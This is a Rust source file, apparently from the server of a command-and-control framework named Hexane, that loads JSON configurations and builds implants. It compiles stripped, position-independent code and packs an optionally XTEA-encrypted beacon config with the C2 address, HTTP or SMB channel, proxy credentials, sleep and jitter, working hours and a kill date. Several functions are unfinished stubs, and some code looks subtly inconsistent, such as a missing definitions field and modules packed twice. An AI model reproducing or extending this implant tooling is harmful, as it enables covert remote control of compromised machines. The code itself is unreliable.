use std::{env, fs};
use rand::Rng;
use std::str::FromStr;
use std::borrow::Borrow;
use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::sync::mpsc::channel;
use rayon::iter::IntoParallelRefIterator;
use crate::server::INSTANCES;
use crate::server::session::{CURDIR, SESSION, USERAGENT};
use crate::server::types::{NetworkType, InjectionOptions, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData, BuildType};
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::error::{Error, Result};
use crate::server::utils::{generate_hashes, wrap_message};
use crate::server::stream::Stream;
use crate::{return_error, length_check_defer};
use crate::server::builder::{generate_definitions, CompileTarget};

pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);

    let mut instance = match map_config(&args[2]) {
        Ok(instance)    => instance,
        Err(e)          => return Err(e),
    };

    instance.setup_instance()?;

    let ref session = SESSION.lock().unwrap();
    instance.user_session.username = session.username.clone();
    instance.user_session.is_admin = session.is_admin.clone();

    if instance.network_type != NetworkType::Http as u8 {
        instance.setup_listener()?;
    }

    wrap_message("info", &format!("{} is ready", instance.builder.output_name));
    INSTANCES.lock().unwrap().push(instance);
    // todo: insert to db

    Ok(())
}

pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);

    let mut instances = INSTANCES.lock().map_err(|e| e.to_string())?;
    if let Some(pos) = instances.iter().position(|instance| instance.builder.output_name == args[2]) {

        wrap_message("info", &format!("{} removed", instances[pos].builder.output_name));
        instances.remove(pos);
        // todo: remove from db

        Ok(())
    } else {
        return_error!("Implant not found")
    }
}


pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
    // todo:: implement
    Ok(())
}

pub fn map_config(file_path: &String) -> Result<Hexane> {
    let json_file = CURDIR.join("json").join(file_path);

    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
    let json_data   = serde_json::from_str::<JsonData>(contents.as_str())?;

    let mut instance    = Hexane::default();
    let session         = SESSION.lock().unwrap();

    instance.group_id       = 0;
    instance.main           = json_data.config;
    instance.loader         = json_data.loader;
    instance.builder        = json_data.builder;
    instance.network        = json_data.network;
    instance.user_session   = session.clone();

    Ok(instance)
}


#[derive(Debug, Default)]
pub struct Hexane {
    pub(crate) current_taskid:  u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,

    pub(crate) crypt_key:       Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) network_type:    u8,
    pub(crate) active:          bool,

    pub(crate) main:            Config,
    pub(crate) builder:         Builder,
    pub(crate) compiler:        Compiler,
    pub(crate) network:         Option<Network>, // says "optional" but is checked for in config
    pub(crate) loader:          Option<Loader>,
    pub(crate) user_session:    UserSession,
}
impl Hexane {
    fn setup_instance(&mut self) -> Result<()> {
        // todo: add config db write/delete
        let mut rng         = rand::thread_rng();

        let strings_file    = "./config/strings.txt";
        let hash_file       = "./core/src/include/names.hpp";

        self.peer_id = rng.random::<u32>();
        self.group_id = 0;

        if self.main.debug {
            self.compiler.compiler_flags = "-std=c++23 -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections".to_owned();
        } else {
            self.compiler.compiler_flags = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections".to_owned();
        }

        wrap_message("debug", &"creating build directory".to_owned());
        fs::create_dir(&self.compiler.build_directory)?;

        wrap_message("debug", &"generating config data".to_owned());
        self.generate_config_bytes()?;

        wrap_message("debug", &"generating string hashes".to_owned());
        generate_hashes(strings_file, hash_file)?;
        generate_definitions(self.definitions);

        wrap_message("debug", &"building sources".to_owned());

        self.compile_sources()?;
        self.run_server()?;

        Ok(())
    }

    fn setup_listener(&mut self) -> Result<()> {
        // todo: listener setup
        Ok(())
    }

    fn generate_config_bytes(&mut self) -> Result<()> {
        self.crypt_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        if self.main.encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        let http    = NetworkType::Http as u8;
        let smb     = NetworkType::Smb as u8;

        if self.network_type == http {
            stream.pack_byte(http);
        } else if self.network_type == smb {
            stream.pack_byte(smb);
        } else {
            return_error!("invalid network type")
        }

        if self.main.architecture == "amd64" {
            stream.pack_dword(1);
        } else {
            stream.pack_dword(0);
        }

        if let Some(modules) = &self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);

        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter as u32);

        if let Some(ref modules) = self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours)?
        } else {
            0
        };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date)?
        } else {
            0
        };

        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        if let Some(network) = self.network.as_mut() {
            match (&network.r#type, &network.options) {

                (NetworkType::Http, NetworkOptions::Http(ref http)) => {
                    stream.pack_wstring(http.useragent.as_ref().unwrap().as_str());
                    stream.pack_wstring(&http.address);
                    stream.pack_dword(http.port as u32);
                    stream.pack_dword(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }

                    if http.domain.is_some() {
                        stream.pack_string(http.domain.as_ref().unwrap().as_str());
                    }

                    if let Some(ref proxy) = http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);

                        stream.pack_dword(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap().as_str());
                        stream.pack_wstring(proxy.password.as_ref().unwrap().as_str());
                    } else {
                        stream.pack_dword(0);
                    }
                },
                (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
                },
                _ => return_error!("unknown network type found in complete config... how could this happen?")
            }
        }

        Ok(stream.buffer)
    }
}

